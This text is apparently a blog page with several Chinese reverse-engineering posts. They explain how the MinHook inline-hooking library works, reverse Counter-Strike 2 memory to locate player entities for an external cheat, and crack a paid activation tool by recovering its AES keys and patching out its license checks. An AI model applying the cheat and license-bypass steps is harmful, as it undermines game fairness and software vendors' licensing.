0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00,0x00, 0xC3 &#125;;// ... *(DWORD32*)(jmpopcode + 1) = (DWORD32)newFuncAddr; *(DWORD32*)(jmpopcode + 9) = (DWORD32)(newFuncAddr &gt;&gt; 32); jmpopcode实际上是这样一段汇编代码，假如我们要跳转到0x 20000000 10000000 123push 0x10000000mov dword [rsp+4], 0x20000000ret 这是在64位下一种特殊的跳转代码，由于jmp指令的限制，只能2GB内内存寻址，到了x64寻址空间大大加大，单纯jmp和call已经无法跳转到地址，所以我们将带跳转的地址依次将低位、高位移动到栈顶（rsp），这样ret就能直接跳转了，这种好处就是不会污染栈和寄存器。 如果在x86（32位）的情况下，直接使用jmp跳转即可 总结一下hook的步骤就是： 找到待hook函数的地址 覆盖待hook函数汇编码，让待hook函数跳转到新的函数 取消hook恢复待hook函数的汇编码即可 P2. 使用MinHook 在项目文件夹中，然后再vs中包含 1git clone https://github.com/TsudaKageyu/minhook 现在我们使用MinHook来实现P1中的功能 123456789101112131415161718192021#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &quot;minhook/MinHook.h&quot;void hello() &#123; std::cout &lt;&lt; &quot;123\\n&quot;;&#125;void newhello() &#123; std::cout &lt;&lt; &quot;This is New hello\\n&quot;;&#125;int main() &#123; LPVOID *lpOldHello = nullptr; MH_Initialize(); MH_CreateHook(hello, newhello, lpOldHello); MH_EnableHook(hello); hello(); MH_DisableHook(hello); hello(); return 0;&#125; 尝试Hook系统函数Sleep 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &quot;minhook/MinHook.h&quot;// 定义指向原始 Sleep 函数的指针类型typedef void (WINAPI* Sleep_t)(DWORD);// 定义指向原始 Sleep 函数的指针Sleep_t fpSleep = nullptr;// 自定义的 MySleep 函数// 参数要保持一致void WINAPI MySleep(DWORD dwMilliseconds)&#123; std::cout &lt;&lt; &quot;MySleep called with &quot; &lt;&lt; dwMilliseconds &lt;&lt; &quot; milliseconds&quot; &lt;&lt; std::endl; // 调用原始的 Sleep 函数 fpSleep(dwMilliseconds);&#125;int main()&#123; MH_Initialize(); // 创建一个 Hook MH_CreateHook(Sleep, MySleep, reinterpret_cast&lt;LPVOID*&gt;(&amp;fpSleep)); // 启用 Hook MH_EnableHook(MH_ALL_HOOKS); Sleep(1000); // 清理 Hook MH_DisableHook(MH_ALL_HOOKS); MH_Uninitialize(); Sleep(1000); return 0;&#125; P3. 代码解读 这里按照Hook Sleep函数的顺序 MH_Initialize 12345678910111213141516171819202122232425262728MH_STATUS WINAPI MH_Initialize(VOID)&#123; MH_STATUS status = MH_OK; EnterSpinLock(); if (g_hHeap == NULL) &#123; g_hHeap = HeapCreate(0, 0, 0); if (g_hHeap != NULL) &#123; // Initialize the internal function buffer. InitializeBuffer(); &#125; else &#123; status = MH_ERROR_MEMORY_ALLOC; &#125; &#125; else &#123; status = MH_ERROR_ALREADY_INITIALIZED; &#125; LeaveSpinLock(); return status;&#125; EnterSpinLock：进入自旋锁，避免在多线程的hook中冲突。对应的是LeaveSpinLock InitializeBuffer：无意义函数 g_hHeap：用于管理g_hooks的句柄，从之前的代码就可以看出来MinHook对于已经hook的函数的取消hook等等的管理一定是有一个全局变量在管理 MH_CreateHook 首先是函数的原型 1MH_STATUS WINAPI MH_CreateHook(LPVOID pTarget, LPVOID pDetour, LPVOID *ppOriginal) pTarget：待hook的函数（旧函数） pDetour：新的函数 ppOriginal：指向旧函数的指针 然后检查旧函数和新韩淑的可执行权限，这里又学到一个新的winapi VirtualQuery 12345678// if (IsExecutableAddress(pTarget) &amp;&amp; IsExecutableAddress(pDetour))BOOL IsExecutableAddress(LPVOID pAddress)&#123; MEMORY_BASIC_INFORMATION mi; VirtualQuery(pAddress, &amp;mi, sizeof(mi)); return (mi.State == MEM_COMMIT &amp;&amp; (mi.Protect &amp; PAGE_EXECUTE_FLAGS));&#125; 关于VirtualQuery函数：https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualquery 12345678910111213141516//////// MH_CreateHook UINT pos = FindHookEntry(pTarget); if (pos == INVALID_HOOK_POS) //////// FindHookEntrystatic UINT FindHookEntry(LPVOID pTarget)&#123; UINT i; for (i = 0; i &lt; g_hooks.size; ++i) &#123; if ((ULONG_PTR)pTarget == (ULONG_PTR)g_hooks.pItems[i].pTarget) return i; &#125; return INVALID_HOOK_POS;&#125; 这里开始就有些复杂了，上来就是两个结构体，不过不用担心，因为FindHookEntry中的g_hooks就没有初始化过，所以只能返回错误：INVALID_HOOK_POS，这样就进入了if里面 1234//////// MH_CreateHook LPVOID pBuffer = AllocateBuffer(pTarget); if (pBuffer != NULL) &#123; 123456789101112131415161718//////// AllocateBufferLPVOID AllocateBuffer(LPVOID pOrigin)&#123; PMEMORY_SLOT pSlot; PMEMORY_BLOCK pBlock = GetMemoryBlock(pOrigin); if (pBlock == NULL) return NULL; // Remove an unused slot from the list. pSlot = pBlock-&gt;pFree; pBlock-&gt;pFree = pSlot-&gt;pNext; pBlock-&gt;usedCount++;#ifdef _DEBUG // Fill the slot with INT3 for debugging. memset(pSlot, 0xCC, sizeof(MEMORY_SLOT));#endif return pSlot;&#125; 123456789101112131415161718192021222324/////// GetMemoryBlock 节选static PMEMORY_BLOCK GetMemoryBlock(LPVOID pOrigin) /*....*/#if defined(_M_X64) || defined(__x86_64__) SYSTEM_INFO si; GetSystemInfo(&amp;si); minAddr = (ULONG_PTR)si.lpMinimumApplicationAddress; maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress; /*....*/#endif // Look the registered blocks for a reachable one. for (pBlock = g_pMemoryBlocks; pBlock != NULL; pBlock = pBlock-&gt;pNext) &#123;#if defined(_M_X64) || defined(__x86_64__) // Ignore the blocks too far. if ((ULONG_PTR)pBlock &lt; minAddr || (ULONG_PTR)pBlock &gt;= maxAddr) continue;#endif // The block has at least one unused slot. if (pBlock-&gt;pFree != NULL) return pBlock; &#125; /*...*/ GetSystemInfo：https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo 1lpMinimumApplicationAddress 指向应用程序和动态链接库可访问的最低内存地址的指针， (DLL) 。 1lpMaximumApplicationAddress 指向应用程序和 DLL 可访问的最高内存地址的指针。 在64位下寻找一块距离参数pOrigin最近的内存地址，作者这里对这种内存自行进行了管理，用的单链表（Windows的内存管理） 接着再回到创建Hook中 12345678if (pBuffer != NULL)&#123; TRAMPOLINE ct; ct.pTarget = pTarget; ct.pDetour = pDetour; ct.pTrampoline = pBuffer; if (CreateTrampolineFunction(&amp;ct)) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657BOOL CreateTrampolineFunction(PTRAMPOLINE ct)#if defined(_M_X64) || defined(__x86_64__) CALL_ABS call = &#123; 0xFF, 0x15, 0x00000002, // FF15 00000002: CALL [RIP+8] 0xEB, 0x08, // EB 08: JMP +10 0x0000000000000000ULL // Absolute destination address &#125;; JMP_ABS jmp = &#123; 0xFF, 0x25, 0x00000000, // FF25 00000000: JMP [RIP+6] 0x0000000000000000ULL // Absolute destination address &#125;; JCC_ABS jcc = &#123; 0x70, 0x0E, // 7* 0E: J** +16 0xFF, 0x25, 0x00000000, // FF25 00000000: JMP [RIP+6] 0x0000000000000000ULL // Absolute destination address &#125;; /*...*/ //计算汇编指令长度 copySize = HDE_DISASM((LPVOID)pOldInst, &amp;hs); /*...*/ if (oldPos &gt;= sizeof(JMP_REL)) &#123; // The trampoline function is long enough. // Complete the function with the jump to the target function.#if defined(_M_X64) || defined(__x86_64__) jmp.address = pOldInst;#else jmp.operand = (UINT32)(pOldInst - (pNewInst + sizeof(jmp)));#endif pCopySrc = &amp;jmp; copySize = sizeof(jmp); finished = TRUE; &#125; /*...*/#ifndef ALLOW_INTRINSICS memcpy((LPBYTE)ct-&gt;pTrampoline + newPos, pCopySrc, copySize);#else __movsb((LPBYTE)ct-&gt;pTrampoline + newPos, (LPBYTE)pCopySrc, copySize);#endif newPos += copySize; oldPos += hs.len; &#125; while (!finished); /*...*/#if defined(_M_X64) || defined(__x86_64__) // Create a relay function. jmp.address = (ULONG_PTR)ct-&gt;pDetour; ct-&gt;pRelay = (LPBYTE)ct-&gt;pTrampoline + newPos; memcpy(ct-&gt;pRelay, &amp;jmp, sizeof(jmp));#endif return TRUE; HDE_DISASM：跟进去是解析汇编指令，计算出当前函数的汇编指令长度。使用的是作者改进过的Hacker Disassembler Engine 64，看了下版权信息还挺古早的 pCopySrc：如果相差很近，能使用jmp则使用jmp，根据条件得到对应的跳转指令 ct-&gt;pRelay：存放跳转的指令 这边感觉作者写的有点复杂，不过确实是好用的，解析反汇编的方法又学到一些，这里看不懂的可以看看后面的动调的解释 1234567//////// MH_CreateHook PHOOK_ENTRY pHook = AddHookEntry(); if (pHook != NULL) &#123; memcpy(pHook-&gt;oldIPs, ct.oldIPs, ARRAYSIZE(ct.oldIPs)); memcpy(pHook-&gt;newIPs, ct.newIPs, ARRAYSIZE(ct.newIPs)); 这里就存储计算出的指令和原始汇编，便于后续启用hook的时候使用 这里的AddHookEntry的时候就已经将返回地pHook加入到g_hook中管理了 123456789101112131415//////// MH_CreateHook if (ct.patchAbove) &#123; memcpy( pHook-&gt;backup, (LPBYTE)pTarget - sizeof(JMP_REL), sizeof(JMP_REL) + sizeof(JMP_REL_SHORT)); &#125; else &#123; memcpy(pHook-&gt;backup, pTarget, sizeof(JMP_REL)); &#125; if (ppOriginal != NULL) *ppOriginal = pHook-&gt;pTrampoline; pHook-&gt;pTrampoline：这里指向的是旧的Sleep的jmp 100007FFAD228B0B0 jmp qword ptr [7FFAD22F0A10h] hook的时候变了 100007FFAD228B0B0 jmp 00007FFAD2260FC7 但是要hook的地址不是jmp呢？这里用到最开始的hello的例子 12345678910111213141516171819202122232425262728#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &quot;minhook/MinHook.h&quot;typedef void (*myhello)();myhello lpOldHello = nullptr;void hello() &#123; std::cout &lt;&lt; &quot;123\\n&quot;;&#125;void newhello() &#123; std::cout &lt;&lt; &quot;This is New hello\\n&quot;; reinterpret_cast&lt;myhello&gt;(lpOldHello)();&#125;int main() &#123; hello(); MH_Initialize(); MH_CreateHook(hello, newhello, reinterpret_cast&lt;LPVOID*&gt;(&amp;lpOldHello)); MH_EnableHook(hello); hello(); MH_DisableHook(hello); hello(); return 0;&#125; 正常调用hello 123400007FF7F1953E64 call hello (07FF7F1953E10h) void hello() &#123;00007FF7F1953E10 sub rsp,28h hook过后 123400007FF6D2C13E47 call qword ptr [lpOldHello (07FF6D2C18898h)] void hello() &#123;00007FF7F1953E10 jmp 00007FF7F1940FD9 在hook中调用原始函数 123456700007FF7F1953E47 call qword ptr [lpOldHello (07FF7F1958898h)]00007FF7F1940FC0 sub rsp,28h 00007FF7F1940FC4 lea rdx,[__xmm@ffffffffffffffffffffffffffffffff+10h (07FF7F1956370h)] 00007FF7F1940FCB jmp qword ptr [7FF7F1940FD1h] 00007FF7F1953E22 call std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt; &gt; (07FF7F1953F40h) 这里就已经说明的很清楚了，我们覆盖前几个字节会污染汇编指令，MinHook会把收到污染的汇编指令复制到一个地方A，A的尾部跳转到原有函数中没有收到污染的部分。 启用hook后修改原始函数的指针到A，这样A执行完后就会执行原函数没有污染的部分 MH_EnableHook || EnableHook 其实调用的是EnableHook，参数为true 1234567891011if (g_hooks.pItems[pos].isEnabled != enable)&#123; FROZEN_THREADS threads; status = Freeze(&amp;threads, pos, ACTION_ENABLE); if (status == MH_OK) &#123; status = EnableHookLL(pos, enable); Unfreeze(&amp;threads); &#125;&#125; EnableHookLL：不管是不是启用全部hook，最终都会来到这里 123456789101112131415161718LPBYTE pPatchTarget = (LPBYTE)pHook-&gt;pTarget;if (!VirtualProtect(pPatchTarget, patchSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) return MH_ERROR_MEMORY_PROTECT;if (enable)&#123; PJMP_REL pJmp = (PJMP_REL)pPatchTarget; pJmp-&gt;opcode = 0xE9; pJmp-&gt;operand = (UINT32)((LPBYTE)pHook-&gt;pDetour - (pPatchTarget + sizeof(JMP_REL))); if (pHook-&gt;patchAbove) &#123; PJMP_REL_SHORT pShortJmp = (PJMP_REL_SHORT)pHook-&gt;pTarget; pShortJmp-&gt;opcode = 0xEB; pShortJmp-&gt;operand = (UINT8)(0 - (sizeof(JMP_REL_SHORT) + sizeof(JMP_REL))); &#125;&#125; 首先确保有足够权限，然后转为PJMP_REL类型的结构体，通过该结构体修改位对应的jmp跳转 第一次jmp后的地址还有一个jmp到指针，这里的指令就是MH_CreateHook时创造出来的 后续的就是取消hook和释放一些全局变量，取消hook用到的是EnableHook，参数为false，因为两个都需要修改函数的汇编指令码。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"MinHook","slug":"MinHook","permalink":"https://joe1sn.eu.org/tags/MinHook/"}]},{"title":"【破解】CS2人物实体逆向","slug":"crackme-cs2-entity-controller","date":"2024-06-01T03:07:53.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/06/01/crackme-cs2-entity-controller/","link":"","permalink":"https://joe1sn.eu.org/2024/06/01/crackme-cs2-entity-controller/","excerpt":"如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址","text":"如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址 或许我们的公众号会有更多你感兴趣的内容 这篇文章发布的时候，关于更多CS2-cheats的代码已经在Github仓库中发布，你可以在下面的链接找到更多CS2的外挂功能 https://github.com/Joe1sn/ExtCheats 游戏环境 Steam上启动的CS2国际服，在设置中加上-insecure参数 在游戏中启用控制台，然后 ` 就可以输入命令了 CS2可以使用CFG文件进行快速的加载，这里我用了一段cfg脚本来进行编写 123456789101112sv_cheats 1mp_roundtime 60mp_roundtime_defuse 60mp_warmup_endmp_freezetime 0mp_maxrounds 30mp_buytime 99999bot_stop 1bot_dont_shoot 1mp_respawn_on_death_t 1mp_respawn_on_death_ct 1mp_restartgame 1 你可以在steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg中防止该文件，然后再游戏中使用exec &lt;不含后缀的文件名&gt; 为了方便调试，可以把屏幕大小改为1280x600 PlayerPawn 简单的CE使用 首先使用准确值找到HP值 在游戏中可以使用hurtme xx来对自身角色造成伤害 这样就找到了几个类似的值，这里有几个要点 由于在真实游戏中我们能控制的只有客户端，没有服务端程序，CS的客户端位于client.dll中，所以我们需要对其进行分析，而且地址最好和该dll相关 cs2使用了Valve研发的source2引擎，所以我们可以利用相关开源信息进行查找，比如有人做了cs2偏移的仓库：https://github.com/a2x/cs2-dumper 。 接着找出有哪些地址访问了这些地址，这里有一个取巧的方法，利用上面的偏移，比如HP的全称是Health Point，那么变量的命名就可能和heal相关，在上面推荐的仓库就可以找到 那么对上面的内存找访问 添加该RCX的值，在 浏览相关内存-&gt;工具-&gt;解析结构体中 我们发现了一个为C_CSPlayerPawn的结构体，接着我们看访问的代码，有两段 那我们就打开client.dll，分析下这段代码 文件位于steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\bin\\win64 第一段可能为虚函数 第二段位于另外一个函数中，我们主要看rsi怎么取到的值，结果发现是这个函数的参数 多看看交叉引用发现引用太复杂，随后放弃 PlayerController 从全局变量找到Controller 继续按照上一面的找搜索到的HP的一堆地址的访问地址，发现 同样的方法我们找到这段代码，然后在IDA中分析 IDA中的基地址从0x180000000开始，加上偏移521BB0就找到了这段代码，然后对该函数的引用分析 发现普遍存在这几个函数 我们先分析下他是这么找到v12的，首先在sub_180697FA0传入了一个v10 先分析sub_180697FA0 1234567891011121314151617181920212223__int64 __fastcall sub_180697FA0(int a1)&#123; __int64 v1; // rax __int64 v2; // rbx char v3; // al __int64 v4; // rcx if ( !off_18172EEE0 ) return 0i64; if ( a1 &lt; 0 ) return 0i64; if ( a1 &gt;= *(off_18172EEE0 + 4) ) return 0i64; v1 = sub_18060A050(qword_18191C5B8, (a1 + 1)); v2 = v1; if ( !v1 ) return 0i64; v3 = (*(*v1 + 0x480i64))(v1); v4 = 0i64; if ( v3 ) return v2; return v4;&#125; 存在全局变量qword_18191C5B8，在CE中分析一下 分析其中的sub_18060A050 123456789101112131415161718__int64 __fastcall sub_18060A050(__int64 a1, int a2)&#123; __int64 v2; // rcx _DWORD *v3; // rcx if ( a2 &lt;= 0x7FFE &amp;&amp; (a2 &gt;&gt; 9) &lt;= 0x3F &amp;&amp; (v2 = *(a1 + 8i64 * (a2 &gt;&gt; 9) + 16)) != 0 &amp;&amp; (v3 = (120i64 * (a2 &amp; 0x1FF) + v2)) != 0i64 &amp;&amp; (v3[4] &amp; 0x7FFF) == a2 ) &#123; return *v3; &#125; else &#123; return 0i64; &#125;&#125; 其中a1为全局变量 a2暂时未知，不过我们可以根据fastcall的传参顺序（ rcx,rdx,r8,r9）或者汇编来看a2传递的是什么参数 编写python算法模拟一下，但是条件中内存有指针，那没有两种思路 利用调试器取值 直接都程序内存 这里用第一种，先不管最后一个条件，计算得到v2 = 0000019CA3550808 然后算出v3 = 0x7ffab466e718 1234567891011121314151617def sub_18060A050(): a1 = 0x000019CA3AD1800 a2 = 1 print(hex(a1 + 8 * (a2 &gt;&gt; 9) + 16)) v2 = 0x000019CA3550808 v3 = 120 * (a2 &amp; 0x1FF) + v2 if (a2 &lt;= 0x7FFE and (a2 &gt;&gt; 9) &lt;= 0x3F and v2 != 0 and v3 != 0 # and (v3[4] &amp; 0x7FFF) == a2 ): print(hex(v3))if __name__ == &quot;__main__&quot;: sub_18060A050() 用CE看一下*v3这个指针的值 那么返回的就是00007FFAB4652500，用CE发现是一个叫做CCSPlayerController的数据结构 看下github上的偏移表 发现有几处关键信息： 这样就可以通过client.dll + 191C5B8加上下标，通过刚才的函数，找到了CCSPlayerController开始的地址 Controller到Pawn 我们继续逆向，根据Controller+0x7E4为m_hPlayerPawn，就用CE看看这个地址有无读写，在观察下汇编发现 由于CE捕获到的两段代码十分相近，那么给rax赋值的话rax引用就可能出现，搜索对[rax]访问找到 1234567891011121314151617181920212223 v11 = *a4; // ////////////// if ( *a4 != -1 &amp;&amp; qword_181819538 &amp;&amp; v11 != -2 &amp;&amp; (v12 = *(qword_181819538 + 8 * ((v11 &amp; 0x7FFF) &gt;&gt; 9))) != 0 &amp;&amp; (v13 = (v12 + 120i64 * (v11 &amp; 0x1FF))) != 0i64 &amp;&amp; *(v13 + 4) == v11 ) &#123; v14 = *v13; &#125; else &#123; v14 = 0i64; &#125; if ( v10 != v14 ) break; ++v5; ++a4; if ( v5 &gt;= a5 ) return 0i64; &#125; return 2i64;&#125; 其中v11就是我捕获到的mPawn值，这里再次出现了全局变量client.dll+1819538 同之前编写脚本计算地址，然后再对照，这里就不再赘述过程了。 得到从CCSPlayerController.mPawn找到对应CSPlayerPawn的方法，这段代码在项目的Cheats的Player类中 12345678910111213141516171819void Player::GetPawn() &#123; DWORD m_hPlayerPawn = GetProcessMem(hProcess, this-&gt;PlayerControllerAddr, 2, 0, CSPlayerController::m_hPlayerPawn); if (this-&gt;ClientDLLBase == 0 || this-&gt;hProcess == NULL) return; DWORD64 entity_list = GetProcessMem(hProcess, this-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, 1, 0); if (!entity_list) return; DWORD64 list_entry = GetProcessMem(hProcess, entity_list + (8 * (this-&gt;Index &amp; 0x7FFF) &gt;&gt; 9) + 0x10, 1, 0); if (!list_entry) return; DWORD64 playerPawn = m_hPlayerPawn; if (!playerPawn) return; DWORD64 list_entry2 = GetProcessMem(hProcess, entity_list + 8 * ((m_hPlayerPawn &amp; 0x7FFF) &gt;&gt; 9) + 0x10, 1, 0); if (!list_entry2) return; this-&gt;PlayerPawnAddr = GetProcessMem(hProcess, list_entry2 + ClientDLL::C_CSPlayerController_Gap * (m_hPlayerPawn &amp; 0x1FF), 1, 0);&#125; Controller的数组 到这里算是总结了吧。之前从全局变量找到Controller，有许多没用的比较和逻辑运算，这些是为了对其和限制大小 找到Controller的就可变为，改代码位于项目的Cheats.cpp中，在Cheats的构造函数中 123DWORD64 ListOffsetA = GetProcessMem(this-&gt;hProcess, this-&gt;ClientDLLBase + ClientDLL::C_CSPlayerController, 1, 0);DWORD64 v2 = GetProcessMem(this-&gt;hProcess, ListOffsetA + 8 * (1 &gt;&gt; 9) + 16, 1, 0);this-&gt;ControllerBase = v2 + ClientDLL::C_CSPlayerController_Gap;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"crack","slug":"crack","permalink":"https://joe1sn.eu.org/tags/crack/"},{"name":"cheats","slug":"cheats","permalink":"https://joe1sn.eu.org/tags/cheats/"}]},{"title":"【破解】一次无害的Coploit激活工具破解","slug":"crackme-coploit","date":"2024-03-28T06:18:41.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/03/28/crackme-coploit/","link":"","permalink":"https://joe1sn.eu.org/2024/03/28/crackme-coploit/","excerpt":"难度：⭐ - 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-","text":"难度：⭐ - 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？- 难度一星，一颗给go，一颗给密码学，减一颗给简单的认证过程 静态分析 首先是来源 下载Windows版看看 哦？golang打包的，看看版本 12&gt; go version .\\authTool.exe.\\authTool.exe: go1.21.0 有点难搞啊，有无Go是无符号的，IDA打开看也是一坨 粗略动态 这个阶段就是看网络活动，文件操作等等，先打开WireShark和Procmon64 然后打开软件跑一下 这个时候ProcessMonitor已经有了，凭经验来说这里只有网络连接有点价值 两个IP：43.x.x.x（记为ipA）和149.x.x.x（记为ipB），按照先后顺序看 在wireshark中ip.addr == 43.x.x.x 在wireshark中ip.addr == 149.x.x.x 两段都是密文，一眼base64，而且解码完成过后也是乱码，接下来回到你想本身 动静结合 根据运行时候的字符串，用golang写过网络请求的小伙伴都知道，网络请求部分是在net库中，立刻在main_main中找到相关 有时间的还在静态跟流程，心急的已经开始用ida动调了 43.x.x.x 写过golang的都知道，获得发送完请求的结果需要使用一个ReadAll之类的东西 看看下面的AES解密 发现有个相关值1234567890123456，但是CBC加密方式的话不知道这个是key还是iv，动态看看 这里slicebytetostring刚好返回，根据汇编的传参，说明接收到的内容可能在RAX寄存器里面 和wireshark拦截到的报文一样，跟进AES解密看看 这里可以自己确认一下，确实是Base64解码的 这里看一下crypto_aes_NewCipher，根据Windows下的传参规则，看一下栈和rcx，rdx，r8，r9 ... 那么应该就是Key了 这里要开始解密了对吧，还是看下相关参数 猜测：这时候的key和iv都是1234567890123456，写个python脚本验证下 123456789101112131415161718192021222324from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport base64def aes_cbc_decrypt(key, iv, ciphertext): cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) plaintext = unpad(plaintext, AES.block_size) return plaintextdef main(): # 密钥和IV（Initialization Vector） key = b&#x27;1234567890123456&#x27; iv = b&#x27;1234567890123456&#x27; ciphertext = base64.b64decode(b&#x27;k9FQxxxxxxxxxxxxxxxxxxx9wy7w==&#x27;) # 解密 plaintext = aes_cbc_decrypt(key, iv, ciphertext) # 输出解密后的明文 print(&quot;Decrypted plaintext:\\n&quot;, plaintext.decode(&#x27;utf-8&#x27;))if __name__ == &quot;__main__&quot;: main() 得到了两个IP，根据后续操作会把解密出的字符串按照,切分开，而且第一个ip就是wireshark得到的，那么就是一个主用，一个备用两个IP 143.x.x.x 这里有个很明显的拼接api的操作，得到url：http://149.x.x.x:8699/api/v，和ipB的流量对上了 接着用了和上面一样的解密函数，解密一下看看 发现了一个新的url，记为urlB 解析这个json，然后就是一些文件操作，然后来到了输入激活码的地方 激活 第一处认证，说明输入的激活码长度要为16，这里后续可能要patch，记一下patch点：00000000006A3CF1 这里还有后续都做了一些信息搜集，其中包括有：时间戳，主机名(hostname)，所有网卡的mac，本地IP，还有一个user（可能是正确的激活码才会有的） 这里调用了一个main_ec，先看一下截至目前拼接的字符串 不用认证分析了，功能：加密，key和iv两个都试一下，密文选择后面base64过后的内容 最后发现使用，key：1234567890ABCDEF，iv：ABCDEF1234567890 拼接好参数，用最开始通讯的密钥和iv进行加密，使用POST送回服务端，貌似我们距离最后的认证也来越近了 校验 接收到返回后就开始各种比较，那么这里就是校验的地方了，直接nop或者jmp掉就可以了，注意jmp的话栈上面的修改别覆盖了，得到第二个patch的位置：00000000006A4293 这里动态调试我就直接改rip过了 破解coploit 哈哈，你不会真的以为有什么方法能免费试用coploit吧 无害之处就在于此 就和chatGPT一样，这个用的时候要联网，联网会验证token，所以这样的token肯定没有在他数据库里面注册过 这些平台只是做一个流量转发，买几个key然后做个token转换然后卖给大家用而已，是不是割韭菜就仁者见仁智者见智了 根据我所了解的大多是修改js文件等等的操作进行的，后续具体修改插件什么的操作，js相关文件怎么实现的，就不再分析了，点到为止 打包 截图的地址可能有问题是因为我重新用IDA打开过一次 0x6A3CF1 nop掉，但是这个内容会返回到服务端，如果服务端默认这个是16个字符串而且使用了下标寻找内容，可能会出问题 0x6A4293 需要注意的是 1234567.text:00000000006A42B5 mov rax, [rsp+0A58h+var_5F0].text:00000000006A42BD mov rbx, [rsp+0A58h+var_968].text:00000000006A42C5 mov rcx, [rsp+0A58h+var_560].text:00000000006A42CD mov rdi, [rsp+0A58h+var_8C8].text:00000000006A42D5 mov rsi, [rsp+0A58h+var_680].text:00000000006A42DD mov r8, [rsp+0A58h+var_9C8].text:00000000006A42E5 call main_writeHostsJSON2 这段修改了寄存器的值，如果跳过可能对main_writeHostsJSON2有不好的影响，把校验全部nop 初步达到效果 网络连接 思路A 根据相关传参，按照一下两次jmp 12345.text: 00000000006631B9 call net_http___Client__Get.text: 00000000006638D8 call os_UserHomeDir----------------------------------------------------------------------------.text: 00000000006641B4 call net_http___Client__Post.text: 00000000006642B5 mov rax, [rsp+0A58h+var_5F0] 思路B 修改域名和ip为自己的，自己搭一套服务 urlA的网络模拟 urls = authURL_A+“,”+authURL_B 使用Key-iv = 1234567890123456-1234567890123456进行AES-CBC加密urls 并返回 urlB的网络模拟 返回如下json值 1&#123;&quot;link&quot;:&quot;https://xxxxx.xyz/xxxx.html&quot;,&quot;type&quot;:&quot;x&quot;,&quot;title&quot;:&quot;x.x&quot;,&quot;id&quot;:x,&quot;linktext&quot;:&quot;xxxxxxxxx&quot;&#125; 接收post传参，返回值随便（客户端得patch） 最终效果","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"crack","slug":"crack","permalink":"https://joe1sn.eu.org/tags/crack/"}]},{"title":"windows内核驱动 8-计时器与通知","slug":"windows-kernel-driver-8-timer-notify","date":"2024-03-27T08:00:21.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/27/windows-kernel-driver-8-timer-notify/","link":"","permalink":"https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/","excerpt":"","text":"在内核中使用定时器、通知和回调 …学到一半打靶场去了 定时器 CPU最短能统计时间为100纳秒 100ns 内核中使用LARGEINT来表示时间长度 1s = -10 *1000 * 1000 基于设备的IO定时器 在DriverEntry里面尝试一下 1234567891011121314VOID TimeWorker(PVOID CONTEXT) &#123; DbgPrint(&quot;Irql: %d\\n&quot;, KeGetCurrentIrql()); DbgPrint(&quot;Process: %s\\n&quot;, PsGetProcessImageFileName(PsGetCurrentProcess()));&#125;NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;// ... IoInitializeTimer(pDevice, TimeWorker, NULL); IoStartTimer(pDevice);&#125;Unload()&#123; IoStopTimer(DriverObject-&gt;DeviceObject);&#125; 主要API IoInitializeTimer：创建定时 IoStartTimer：开启定时 IoStopTimer：关闭定时 技巧 同时启用两个定时器可以关闭PCHUNTER 做认证 结合DPC的定时器 123456789101112//全局变量KDPC kDPC = &#123; 0 &#125;;LARGE_INTEGER DpcTime = &#123; 0 &#125;; KeInitializeTimer(&amp;keTimer); KDPC kDPC = &#123; 0 &#125;; KeInitializeDpc(&amp;kDPC, &amp;DpcRoutineFunc, NULL); LARGE_INTEGER DpcTime = &#123; 0 &#125;; DpcTime.QuadPart = -10 * 1000 * 2000; KeSetTimer(&amp;keTimer, DpcTime, &amp;kDPC);KeCancelTimer(&amp;keTimer); 后续可以通过KeWait来判断超时之类的 这个只会触发一次 放在工作队列线程池中运行 12ExInitializeWorkItem(&amp;work_item, WorkItemRoutine, NULL);ExQueueWorkItem(&amp;work_item, CriticalWorkQueue); 例程级别很低 WorkItemRoutine别陷入死循环，同步 通知 通知：发生某一件事变更，知道事情变更，但不能操作变更的结果。PsCreateNotify 回调：能拦截相关信息，更改流程和结果。 windows内核驱动 6-链表与进程讲了部分 模块加载回调： 123456789101112131415161718192021VOID ImageRoutine( PUNICODE_STRING FullImageName, HANDLE ProcessId, // pid into which image is being mapped PIMAGE_INFO ImageInfo) &#123; //DbgPrint(&quot;Triigered callback\\n&quot;); PEPROCESS temppe = NULL; NTSTATUS status = STATUS_SUCCESS; status = PsLookupProcessByProcessId(ProcessId, &amp;temppe); if (NT_SUCCESS(status)) &#123; ObDereferenceObject(temppe); PUCHAR imagename = PsGetProcessImageFileName(temppe); DbgPrint(&quot;[%s] load [%wZ] with baseaddr [%llx]\\n&quot;, imagename, FullImageName, ImageInfo-&gt;ImageBase); &#125; //DbgPrint(&quot;FullImageName: 